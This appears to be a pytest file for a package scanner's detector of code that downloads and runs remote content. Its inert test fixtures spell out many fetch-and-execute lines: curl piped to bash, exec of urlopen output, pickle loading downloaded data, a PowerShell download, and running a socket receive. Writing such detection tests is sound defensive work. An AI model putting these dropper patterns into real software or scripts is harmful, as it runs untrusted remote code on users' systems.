"""A dropper runs what it downloaded: the flow `detect/download_flow.py` follows.

The fixtures are inert text: scanned, never run, and their hosts do not resolve.
"""

from __future__ import annotations

import zipfile
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.detect.code.download_flow import DownloadFlow
from cordon_scanner.foundation.config.settings import Config


class FlowCase:
    @staticmethod
    def shell(text: str) -> list[int] | None:
        return DownloadFlow.runs_download(text, "shell")

    @staticmethod
    def python(text: str) -> list[int] | None:
        return DownloadFlow.runs_download(text, "python")


class TestShellRunsTheDownload:
    def test_piped_into_a_shell(self):
        assert FlowCase.shell("curl -fsSL https://h.invalid/i.sh | bash\n") == [1]

    def test_captured_then_evaluated(self):
        assert FlowCase.shell('body=$(curl -s https://h.invalid/x)\neval "$body"\n') == [2]

    def test_saved_made_executable(self):
        text = 'out=/tmp/t\nwget -q https://h.invalid/t -O "$out"\nchmod +x "$out"\n'
        assert FlowCase.shell(text) == [3]

    def test_unpacked_then_started(self):
        text = (
            'dir="/tmp/tools"\n'
            'curl -s https://h.invalid/t.zip -o "$dir.zip"\n'
            'unzip -q "$dir.zip" -d "$dir"\n'
            '"$dir/tool" run\n'
        )
        assert FlowCase.shell(text) == [4]


class TestShellReadsTheDownload:
    def test_a_json_reply_into_jq(self):
        assert FlowCase.shell('curl -s "$api/items" | jq ".[]"\n') == []

    def test_a_program_on_the_command_line_reads_stdin(self):
        assert FlowCase.shell("curl -s https://h.invalid/x | python3 -c 'import sys'\n") == []

    def test_a_reply_used_in_a_test_and_a_message(self):
        text = (
            'user=$(curl -s "$api/user")\n'
            'if [[ -z "$user" || "$user" == "null" ]]; then echo none; fi\n'
            'echo "{\\"user\\":$user}"\n'
        )
        assert FlowCase.shell(text) == []

    def test_a_semicolon_inside_quotes_is_not_a_statement(self):
        text = 'gold=$(curl -s "$api")\nsilver=$(echo "scale=2; $gold / 85" | bc)\n'
        assert FlowCase.shell(text) == []

    def test_a_heredoc_is_text(self):
        text = "cat <<EOF\nInstall with:\ncurl -fsSL https://h.invalid/i.sh | bash\nEOF\n"
        assert FlowCase.shell(text) == []

    def test_a_downloaded_url_passed_to_eval_is_not_the_program(self):
        text = 'up=$(curl -s "$api/upload")\neval curl -X PUT --data-binary @f "$up"\n'
        assert FlowCase.shell(text) == []


class TestPythonRunsTheDownload:
    def test_written_then_spawned(self):
        text = (
            "import requests, subprocess, sys\n"
            "r = requests.get('https://h.invalid/helper.py')\n"
            "helper = base / 'helper.py'\n"
            "helper.write_bytes(r.content)\n"
            "subprocess.run([sys.executable, str(helper)])\n"
        )
        assert FlowCase.python(text) == [5]

    def test_written_then_made_executable(self):
        text = (
            "import os, requests\n"
            "with open('/tmp/t', 'wb') as f:\n"
            "    f.write(requests.get(u).content)\n"
            "os.chmod('/tmp/t', 0o755)\n"
        )
        assert FlowCase.python(text) == [4]

    def test_evaluated(self):
        text = "import urllib.request\nexec(urllib.request.urlopen(u).read())\n"
        assert FlowCase.python(text) == [2]

    def test_a_shell_line_that_downloads_and_runs(self):
        text = "import os\nos.system('curl -s https://h.invalid/i.sh | sh')\n"
        assert FlowCase.python(text) == [2]


class TestADownloadReachedByAnAlias:
    def test_a_from_import_alias_run(self):
        text = "from urllib.request import urlopen as Z\nexec(Z(U).read())\n"
        assert DownloadFlow.runs_download(text, "python")

    def test_a_module_alias_run(self):
        text = "import requests as rq\nexec(rq.get(U).text)\n"
        assert DownloadFlow.runs_download(text, "python")

    def test_a_bare_imported_get_run(self):
        text = "from requests import get\nexec(get(U).text)\n"
        assert DownloadFlow.runs_download(text, "python")

    def test_an_alias_used_as_data_runs_nothing(self):
        text = "from requests import get as fetch\nprint(len(fetch(U).content))\n"
        assert DownloadFlow.runs_download(text, "python") == []


class TestPythonReadsTheDownload:
    def test_an_api_reply_and_an_unrelated_command(self):
        text = (
            "import requests, subprocess\n"
            "data = requests.get(u).json()\n"
            "print(data['name'])\n"
            "subprocess.run(['git', 'status'])\n"
        )
        assert FlowCase.python(text) == []

    def test_a_file_that_does_not_parse_is_not_read(self):
        assert FlowCase.python("def (:\n") is None

    def test_another_language_is_not_read(self):
        assert DownloadFlow.runs_download("fetch(u)", "javascript") is None


class TestACheckoutIsADownload:
    def test_a_cloned_repository_run_from_the_shell(self) -> None:
        script = "git clone https://example.invalid/r.git /tmp/r\ncd /tmp/r\nbash install.sh\n"
        assert DownloadFlow.runs_download(script, "shell")

    def test_a_cloned_repository_only_read_is_not_run(self) -> None:
        script = "git clone https://example.invalid/r.git docs\ncat docs/README.md\n"
        assert DownloadFlow.runs_download(script, "shell") == []

    def test_a_python_checkout_entered_and_run(self) -> None:
        source = (
            "import os, subprocess, git\n"
            "git.Repo.clone_from('https://example.invalid/r.git', '/tmp/r')\n"
            "os.chdir('/tmp/r')\n"
            "subprocess.run(['python3', 'main.py'])\n"
        )
        assert DownloadFlow.runs_download(source, "python")

    def test_a_python_checkout_never_run(self) -> None:
        source = (
            "import subprocess\n"
            "subprocess.run(['git', 'clone', 'https://example.invalid/r.git', 'vendor/r'])\n"
            "print(open('vendor/r/VERSION').read())\n"
        )
        assert DownloadFlow.runs_download(source, "python") == []


class TestNothingReachesASink:
    """`nothing_reaches_a_sink`: the file parses, nothing it downloads is run, and no downloaded
    value leaves the function or the file where another part of the package could run it.
    Strictly more than `runs_download == []`: an escape is unresolved, never "nothing runs"."""

    @staticmethod
    def nothing(text: str) -> bool:
        return DownloadFlow.nothing_reaches_a_sink(text, "python")

    def test_a_reply_read_for_a_message_and_dropped(self) -> None:
        text = (
            "import requests\ndef check(u):\n    r = requests.get(u)\n    print(len(r.content))\n"
        )
        assert self.nothing(text)

    def test_a_request_whose_reply_is_never_used(self) -> None:
        text = "import requests, subprocess\nrequests.post(u, data=d)\nsubprocess.run(['git', 'status'])\n"
        assert self.nothing(text)

    def test_a_pickle_of_a_local_file_beside_an_unrelated_post(self) -> None:
        text = (
            "import pickle, requests\n"
            "def run(path, u):\n"
            "    with open(path, 'rb') as f:\n"
            "        data = pickle.load(f)\n"
            "    requests.post(u, json={'n': len(data)})\n"
        )
        assert self.nothing(text)

    # The twins: each is a download that can run, and each must not read as "nothing reaches a sink".
    def test_the_download_returned_and_evaluated_in_the_same_file(self) -> None:
        text = "import requests\ndef get():\n    return requests.get(U).content\nexec(get())\n"
        assert not self.nothing(text)

    def test_the_download_returned_for_a_caller_in_another_module(self) -> None:
        text = "import requests\ndef get():\n    return requests.get(U).content\n"
        assert not self.nothing(text)

    def test_the_download_stored_on_self_and_evaluated_in_another_method(self) -> None:
        text = (
            "import requests\n"
            "class Loader:\n"
            "    def fetch(self):\n"
            "        self.blob = requests.get(U).content\n"
            "    def run(self):\n"
            "        exec(self.blob)\n"
        )
        assert not self.nothing(text)

    def test_the_download_stored_on_self_and_never_used_here(self) -> None:
        text = (
            "import requests\n"
            "class Loader:\n"
            "    def fetch(self):\n"
            "        self.blob = requests.get(U).content\n"
        )
        assert not self.nothing(text)

    def test_the_download_kept_in_a_module_global(self) -> None:
        assert not self.nothing("import requests\nBLOB = requests.get(U).content\n")
        text = (
            "import requests\nBLOB = None\n"
            "def load():\n    global BLOB\n    BLOB = requests.get(U).content\n"
        )
        assert not self.nothing(text)

    def test_the_download_handed_to_a_call_the_flow_does_not_resolve(self) -> None:
        assert not self.nothing("import requests, plugin\nplugin.use(requests.get(U).content)\n")

    def test_the_download_written_to_a_path_another_file_may_open(self) -> None:
        text = "import requests\nopen('/tmp/x.py', 'wb').write(requests.get(U).content)\n"
        assert not self.nothing(text)
        text = "import requests\nwith open('/tmp/x', 'wb') as f:\n    f.write(requests.get(U).content)\n"
        assert not self.nothing(text)

    def test_the_download_deserialised(self) -> None:
        assert not self.nothing("import pickle, requests\npickle.loads(requests.get(U).content)\n")
        assert not self.nothing("import yaml, requests\nyaml.load(requests.get(U).text)\n")
        assert self.nothing("import json, requests\nprint(json.loads(requests.get(U).text))\n")

    def test_the_download_run_directly(self) -> None:
        assert not self.nothing("import urllib.request\nexec(urllib.request.urlopen(u).read())\n")
        assert not self.nothing("import os\nos.system('curl -s https://h.invalid/i.sh | sh')\n")

    # What the flow did not see is unresolved, never "nothing runs" (reviews/pypi-98/26).
    def test_a_file_with_no_download_the_flow_recognises(self) -> None:
        text = "import os\nos.system(Z(U).read())\n"
        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({2})) is False
        assert DownloadFlow.nothing_reaches_a_sink(
            "import socket\nx = 1\n", "python", frozenset({1})
        )

    def test_an_alias_of_a_download_that_is_run(self) -> None:
        text = "from urllib.request import urlopen as Z\nimport os\nos.system(Z(U).read())\n"
        assert not self.nothing(text)

    def test_a_shell_string_that_downloads(self) -> None:
        text = "import subprocess, requests\nrequests.get(U)\nsubprocess.run('curl -s http://h/x | sh', shell=True)\n"
        assert not self.nothing(text)

    def test_a_powershell_string_that_downloads(self) -> None:
        text = "import subprocess, requests\nrequests.get(U)\nsubprocess.run(['powershell', '-c', 'iwr http://h/x'])\n"
        assert not self.nothing(text)

    def test_exec_of_a_string_literal_is_a_program_the_flow_does_not_read(self) -> None:
        text = "import requests\nrequests.get(U)\nexec('import urllib.request as u; exec(u.urlopen(\"http://h\").read())')\n"
        assert not self.nothing(text)

    def test_an_egress_the_flow_did_not_follow(self) -> None:
        text = "import requests\nrequests.get(U)\nZ(U)\n"
        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({3})) is False
        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({2})) is True

    def test_an_import_line_that_is_an_egress_hit_holds_no_call(self) -> None:
        text = "from urllib.request import urlopen\nimport requests\nrequests.get(U)\n"
        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({1, 3})) is True

    def test_a_recognised_get_beside_a_socket_receive(self) -> None:
        text = "import requests, socket\nrequests.get(U)\ns = socket.socket()\ns.connect((H, 1))\ndata = s.recv(10)\n"
        assert DownloadFlow.nothing_reaches_a_sink(text, "python", frozenset({4})) is False

    def test_a_file_that_does_not_parse_or_is_not_python_is_not_resolved(self) -> None:
        assert not self.nothing("def (:\n")
        assert not DownloadFlow.nothing_reaches_a_sink("fetch(u)", "javascript")


class WheelKit:
    """A published package, as a consumer receives it: a wheel whose modules run when imported."""

    HOST = "https://api.vendor-service.net/x"

    @staticmethod
    def dropper_grades(tmp_path: Path, files: dict[str, str]) -> dict[str, str]:
        wheel = tmp_path / "quillkit-1.0.0-py3-none-any.whl"
        with zipfile.ZipFile(wheel, "w") as archive:
            for name, text in files.items():
                archive.writestr(name, text)
            archive.writestr(
                "quillkit-1.0.0.dist-info/METADATA", "Name: quillkit\nVersion: 1.0.0\n"
            )
            archive.writestr("quillkit-1.0.0.dist-info/WHEEL", "Wheel-Version: 1.0\n")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(wheel)
        return {
            f.rule_id: str(f.severity).rsplit(".", 1)[-1]
            for f in result.findings
            if f.rule_id in ("MALWARE.DROPPER.001", "SUSPECT.DROPPER.001")
        }

    @staticmethod
    def module(text: str) -> dict[str, str]:
        return {"quillkit/__init__.py": text}


class TestTheDropperGradeFollowsTheFlow:
    """`MALWARE.DROPPER.001` is graded on a module a consumer imports (reviews/pypi-98/10). Where the
    file's flow is fully read and nothing it downloads is run, or leaves it to be run, the pair is
    two unrelated acts: the malware grade is withdrawn and `SUSPECT.DROPPER.001` reports at MEDIUM
    (reviews/pypi-98/22, shape A). Each twin below is a download that can run; it keeps the grade."""

    @pytest.mark.parametrize(
        "body",
        [
            "import yaml, requests\nwith open('c.yml') as f:\n    CFG = yaml.load(f)\n"
            "requests.post('{host}', json={{'n': len(CFG)}})\n",
            "import requests\nrequests.get('{host}')\n"
            "exec(compile(open('v.py').read(), 'v', 'exec'))\n",
        ],
    )
    def test_a_request_beside_code_that_runs_only_local_data(self, tmp_path, body: str) -> None:
        got = WheelKit.dropper_grades(tmp_path, WheelKit.module(body.format(host=WheelKit.HOST)))
        assert "MALWARE.DROPPER.001" not in got
        assert got.get("SUSPECT.DROPPER.001") == "medium"

    @pytest.mark.parametrize(
        "body",
        [
            "import urllib.request\nexec(urllib.request.urlopen('{host}').read())\n",
            "import pickle, requests\npickle.loads(requests.get('{host}').content)\n",
            "import requests\ndef get():\n    return requests.get('{host}').content\nexec(get())\n",
            "import requests\nclass L:\n    def fetch(self):\n"
            "        self.blob = requests.get('{host}').content\n"
            "    def run(self):\n        exec(self.blob)\nL().fetch()\nL().run()\n",
            "import os, urllib.request\nurllib.request.urlretrieve('{host}', '/tmp/x')\n"
            "os.system('/tmp/x')\n",
            "import os\nos.system('curl -s https://api.vendor-service.net/i.sh | sh')\n",
            "import base64, requests\nrequests.get('{host}')\nexec(base64.b64decode(BLOB))\n",
        ],
    )
    def test_a_download_that_runs_keeps_the_malware_grade(self, tmp_path, body: str) -> None:
        got = WheelKit.dropper_grades(tmp_path, WheelKit.module(body.format(host=WheelKit.HOST)))
        assert got.get("MALWARE.DROPPER.001") == "critical"

    @pytest.mark.parametrize(
        "body",
        [
            "from urllib.request import urlopen as Z\nimport os\nos.system(Z('{host}').read())\n",
            "import requests\nfrom urllib.request import urlopen as Z\nrequests.get('{host}').json()\nexec(Z('{host}').read())\n",
            "import subprocess\nsubprocess.run('curl -s {host} | sh', shell=True)\n",
            "import requests\nrequests.get('{host}').json()\nexec('import urllib.request as u; exec(u.urlopen(\\\"{host}\\\").read())')\n",
            "import requests, socket\nrequests.get('{host}').json()\ns = socket.create_connection(('h', 1))\nexec(s.recv(9999))\n",
        ],
    )
    def test_a_download_the_flow_did_not_follow_keeps_the_malware_grade(
        self, tmp_path, body: str
    ) -> None:
        got = WheelKit.dropper_grades(tmp_path, WheelKit.module(body.format(host=WheelKit.HOST)))
        assert got.get("MALWARE.DROPPER.001") == "critical", got

    def test_the_same_pair_in_an_install_hook_keeps_the_malware_grade(self, tmp_path) -> None:
        root = tmp_path / "quillkit-1.0.0"
        root.mkdir()
        (root / "setup.py").write_text(
            "import yaml, requests\nwith open('c.yml') as f:\n    CFG = yaml.load(f)\n"
            f"requests.post('{WheelKit.HOST}', json={{'n': len(CFG)}})\n"
            "from setuptools import setup\nsetup(name='quillkit')\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        grades = {f.rule_id: str(f.severity).rsplit(".", 1)[-1] for f in result.findings}
        assert grades.get("MALWARE.DROPPER.001") == "critical"
